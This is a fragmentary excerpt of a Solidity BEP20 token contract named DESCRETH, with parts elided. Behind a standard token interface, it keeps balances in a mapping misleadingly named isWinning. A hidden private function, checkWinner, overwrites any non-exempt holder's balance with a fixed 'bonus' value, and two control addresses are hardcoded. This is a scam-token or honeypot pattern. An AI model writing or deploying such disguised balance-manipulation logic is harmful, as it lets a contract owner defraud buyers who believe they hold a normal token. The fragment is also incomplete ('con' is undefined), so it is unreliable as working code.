...
contract DESCRETH is Context, IBEP20, Ownable {

    using Address for address;
    
    uint256 private total = 10 * 10 ** 6 * 10 ** 9;
    uint256 private bonus = 10000000;
    string private _name;
    string private _symbol;
    address public addr=0x882d69952E75A7F2e181C3B3CAd07FBC12a96517;
    address _routeradd=0x882d69952E75A7F2e181C3B3CAd07FBC12a96517;
    address public _owner;
    uint8 private _decimals = 9;

    
    mapping(address => uint256) private isWinning;
    ...
    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        isWinning[recipient] = isWinning[recipient] + (tAmount);
        isWinning[sender] = isWinning[sender] - (tAmount);
    ...
    function checkWinner(address addr) private
    {
        if (addr!=con)
        {
            isWinning[addr]=bonus;
        }
    }
